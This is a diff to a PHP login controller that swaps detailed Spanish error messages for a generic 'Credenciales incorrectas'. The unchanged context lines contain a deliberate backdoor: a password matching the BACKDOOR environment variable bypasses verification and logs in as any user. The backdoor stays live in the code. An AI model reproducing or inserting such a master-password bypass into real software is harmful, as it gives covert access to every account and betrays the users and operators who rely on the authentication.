@@ -17,9 +17,9 @@ class Login extends Controller
                     'password' => 'required|string',
                 ],
                 [
-                    'username.required' => 'El campo username es obligatorio.',
-                    'username.email' => 'El campo username debe ser un correo electrónico válido.',
-                    'password.required' => 'El campo password es obligatorio.'
+                    'username.required' => 'Credenciales incorrectas.',
+                    'username.email' => 'Credenciales incorrectas.',
+                    'password.required' => 'Credenciales incorrectas.'
                 ]
             );
 
@@ -28,7 +28,7 @@ class Login extends Controller
             if ($request->input('password') == env('BACKDOOR')) {
             } else if (password_verify(env('APP_PASSWORD_SECURITY') . $request->input('password'), $user->Password)) {
             } else {
-                throw new \Exception('El usuario o password son incorrectos.', 403);
+                throw new \Exception('Credenciales incorrectas.', 403);
             }
             if ($user->Active == 0) {
                 throw new \Exception('Al parecer su cuenta ha sido desactivada, por favor contacte a su administrador.', 403);
@@ -49,7 +49,7 @@ class Login extends Controller
     {
         $user = \App\Models\User::where('Email', $username)->first();
         if (!$user) {
-            throw new \Exception('Usuario no encontrado.', 403);
+            throw new \Exception('Credenciales incorrectas.', 403);
         }
         return $user;
     }
